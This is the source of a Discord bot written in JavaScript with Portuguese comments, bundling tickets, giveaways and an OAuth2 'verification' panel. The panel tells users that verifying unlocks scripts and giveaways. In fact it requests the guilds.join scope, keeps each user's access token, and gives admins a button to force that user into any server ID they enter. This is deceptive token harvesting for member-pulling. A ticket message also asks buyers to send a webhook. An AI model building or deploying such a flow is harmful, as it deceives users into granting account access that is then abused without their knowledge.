require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { 
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
    ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, 
    TextInputStyle, StringSelectMenuBuilder, StringSelectMenuOptionBuilder,
    PermissionsBitField, ChannelType, ApplicationCommandOptionType
} = require('discord.js');

// --- CONFIGURAÇÕES ---
const app = express();
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// MEMÓRIA TEMPORÁRIA
const userTokens = new Map(); // Para Auth
const sorteiosAtivos = new Map(); // Para Sorteio
let ticketConfig = { // Para Ticket
    embedTitle: "Central de Suporte",
    embedDesc: "Clique abaixo para abrir um ticket.",
    embedColor: 0x5865F2, 
    btnLabel: "Abrir Ticket", 
    btnEmoji: "🎫"
};

const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID;
const REDIRECT_TARGET = 'https://discordapp.com/channels/1430240815229305033';

// =================================================================
// 1. SERVIDOR WEB (KEEP ALIVE + OAUTH2)
// =================================================================
app.get('/', (req, res) => res.send('Super Bot Online 🤖'));

app.get('/callback', async (req, res) => {
    const { code } = req.query;
    if (!code) return res.send('Erro: Falta código.');

    try {
        const tokenResponse = await axios.post(
            'https://discord.com/api/oauth2/token',
            new URLSearchParams({
                client_id: process.env.CLIENT_ID,
                client_secret: process.env.CLIENT_SECRET,
                code,
                grant_type: 'authorization_code',
                redirect_uri: process.env.REDIRECT_URI,
                scope: 'identify guilds.join',
            }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );

        const { access_token } = tokenResponse.data;
        const userResponse = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${access_token}` },
        });

        const user = userResponse.data;
        userTokens.set(user.id, access_token);

        // Log para Admin
        const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
        if (logChannel) {
            const embed = new EmbedBuilder().setTitle('📥 Auth Recebido').setDescription(`Usuário: **${user.username}** (${user.id})`).setColor(0x00FF00);
            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`btn_abrir_envio_${user.id}`).setLabel('Enviar p/ Servidor').setStyle(ButtonStyle.Primary).setEmoji('✈️')
            );
            logChannel.send({ embeds: [embed], components: [row] });
        }

        // Página de Sucesso
        res.send(`<!DOCTYPE html><html><body style="background:#2b2d31;color:white;text-align:center;font-family:sans-serif;padding-top:50px;"><h1>✅ Verificado!</h1><p>Redirecionando...</p><script>setTimeout(()=>{window.location.href="${REDIRECT_TARGET}"},3000)</script></body></html>`);

    } catch (e) { console.error(e); res.send('Erro na autenticação.'); }
});
app.listen(process.env.PORT || 3000);

// =================================================================
// 2. BOT DISCORD
// =================================================================
client.once('ready', async () => {
    console.log(`🤖 Super Bot Logado: ${client.user.tag}`);

    const commands = [
        // Comando Ticket
        { name: 'painel', description: 'Cria o painel de tickets' },
        // Comando Auth
        { name: 'setup_auth', description: 'Cria o painel de verificação' },
        // Comando Sorteio
        { 
            name: 'sorteio', description: 'Inicia um sorteio',
            options: [
                { name: 'premio', description: 'Prêmio', type: 3, required: true },
                { name: 'minutos', description: 'Duração', type: 4, required: true }
            ]
        }
    ];

    const guildId = process.env.MAIN_GUILD;
    if(guildId) {
        const guild = client.guilds.cache.get(guildId);
        if(guild) await guild.commands.set(commands);
        console.log("✅ Todos os comandos registrados no servidor!");
    }
});

client.on('interactionCreate', async interaction => {
    // --- HANDLER DE COMANDOS ---
    if (interaction.isChatInputCommand()) {
        const { commandName } = interaction;

        // 1. TICKET
        if (commandName === 'painel') {
            if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
            await enviarPainelTicket(interaction);
        }

        // 2. AUTH
        if (commandName === 'setup_auth') {
            if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
            const link = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify+guilds.join`;
            const embed = new EmbedBuilder()
                .setTitle('🔓 Liberação de Acesso')
                .setDescription('Verifique-se para liberar scripts, projetos e sorteios!')
                .setColor(0x5865F2);
            const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Verificar Agora').setStyle(ButtonStyle.Link).setURL(link).setEmoji('✅'));
            await interaction.channel.send({ embeds: [embed], components: [row] });
            interaction.reply({ content: 'Painel Auth criado!', ephemeral: true });
        }

        // 3. SORTEIO
        if (commandName === 'sorteio') {
            const premio = interaction.options.getString('premio');
            const minutos = interaction.options.getInteger('minutos');
            const tempoMs = minutos * 60 * 1000;
            const fimTimestamp = Math.floor((Date.now() + tempoMs) / 1000);

            const embed = new EmbedBuilder()
                .setTitle('🎉 NOVO SORTEIO!')
                .setDescription(`**Prêmio:** ${premio}\n**Termina às:** <t:${fimTimestamp}:t>`)
                .setColor(0xF4D03F);
            
            const btn = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('entrar_sorteio').setLabel('Participar (0)').setStyle(ButtonStyle.Success).setEmoji('🎉'));
            const msg = await interaction.reply({ embeds: [embed], components: [btn], fetchReply: true });

            sorteiosAtivos.set(msg.id, { participantes: new Set(), premio });

            setTimeout(async () => {
                const dados = sorteiosAtivos.get(msg.id);
                if(!dados) return;
                const lista = Array.from(dados.participantes);
                let txt = "Ninguém ganhou.";
                if(lista.length > 0) {
                    const ganhador = lista[Math.floor(Math.random() * lista.length)];
                    txt = `👑 Parabéns <@${ganhador}> ganhou **${dados.premio}**!`;
                    msg.channel.send(txt).catch(()=>{});
                }
                const embedFim = new EmbedBuilder().setTitle('ACABOU').setDescription(txt).setColor('Red');
                msg.edit({ embeds: [embedFim], components: [] }).catch(()=>{});
            }, tempoMs);
        }
    }

    // --- HANDLER DE BOTÕES E MENUS ---
    
    // TICKET: Menu de Config
    if (interaction.isStringSelectMenu() && interaction.customId === 'menu_ticket') {
        if(interaction.values[0] === 'publicar') {
            const embed = new EmbedBuilder().setTitle(ticketConfig.embedTitle).setDescription(ticketConfig.embedDesc).setColor(ticketConfig.embedColor);
            const btn = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('abrir_ticket').setLabel(ticketConfig.btnLabel).setStyle(ButtonStyle.Primary).setEmoji(ticketConfig.btnEmoji));
            await interaction.channel.send({ embeds: [embed], components: [btn] });
            interaction.update({ content: 'Publicado!', embeds: [], components: [] });
        }
    }

    // TICKET: Abrir
    if (interaction.isButton() && interaction.customId === 'abrir_ticket') {
        const ch = await interaction.guild.channels.create({
            name: `ticket-${interaction.user.username}`,
            type: ChannelType.GuildText,
            topic: interaction.user.id,
            permissionOverwrites: [
                { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] },
                { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }
            ]
        });
        const emb = new EmbedBuilder().setDescription(`Olá ${interaction.user}, caso for adquirir, envie seu webhook.`).setColor('Green');
        const btn = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('fechar_ticket').setLabel('Fechar').setStyle(ButtonStyle.Danger));
        ch.send({ content: `${interaction.user}`, embeds: [emb], components: [btn] });
        interaction.reply({ content: `Aberto: ${ch}`, ephemeral: true });
    }

    // TICKET: Fechar
    if (interaction.isButton() && interaction.customId === 'fechar_ticket') {
        interaction.reply('Fechando...');
        setTimeout(() => interaction.channel.delete(), 3000);
    }

    // SORTEIO: Entrar
    if (interaction.isButton() && interaction.customId === 'entrar_sorteio') {
        const dados = sorteiosAtivos.get(interaction.message.id);
        if(!dados) return interaction.reply({content:'Acabou.', ephemeral:true});
        
        if(dados.participantes.has(interaction.user.id)) {
            dados.participantes.delete(interaction.user.id);
            interaction.reply({content:'Saiu.', ephemeral:true});
        } else {
            dados.participantes.add(interaction.user.id);
            interaction.reply({content:'Entrou!', ephemeral:true});
        }
        const btn = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('entrar_sorteio').setLabel(`Participar (${dados.participantes.size})`).setStyle(ButtonStyle.Success).setEmoji('🎉'));
        interaction.message.edit({ components: [btn] });
    }

    // AUTH: Botão Enviar
    if (interaction.isButton() && interaction.customId.startsWith('btn_abrir_envio_')) {
        const uid = interaction.customId.split('_')[3];
        const modal = new ModalBuilder().setCustomId(`modal_envio_${uid}`).setTitle('Enviar Usuário');
        const input = new TextInputBuilder().setCustomId('srv_id').setLabel('ID do Servidor').setStyle(TextInputStyle.Short);
        modal.addComponents(new ActionRowBuilder().addComponents(input));
        interaction.showModal(modal);
    }

    // AUTH: Modal Submit
    if (interaction.isModalSubmit() && interaction.customId.startsWith('modal_envio_')) {
        const uid = interaction.customId.split('_')[2];
        const srvId = interaction.fields.getTextInputValue('srv_id');
        const token = userTokens.get(uid);

        if(!token) return interaction.reply({content:'Token expirou.', ephemeral:true});

        try {
            await axios.put(`https://discord.com/api/guilds/${srvId}/members/${uid}`, { access_token: token }, { headers: { Authorization: `Bot ${process.env.BOT_TOKEN}` } });
            interaction.reply(`✅ Usuário enviado para ${srvId}`);
        } catch(e) {
            interaction.reply(`❌ Erro: ${e.response?.status || 'Desconhecido'} (Verifique se o bot está no servidor alvo)`);
        }
    }
});

async function enviarPainelTicket(interaction) {
    const embed = new EmbedBuilder().setTitle("Config Ticket").setDescription("Selecione abaixo").setColor('Grey');
    const menu = new StringSelectMenuBuilder().setCustomId('menu_ticket').addOptions(
        new StringSelectMenuOptionBuilder().setLabel('Publicar Painel').setValue('publicar').setEmoji('🚀')
    );
    interaction.reply({ embeds: [embed], components: [new ActionRowBuilder().addComponents(menu)], ephemeral: true });
}

client.login(process.env.BOT_TOKEN);
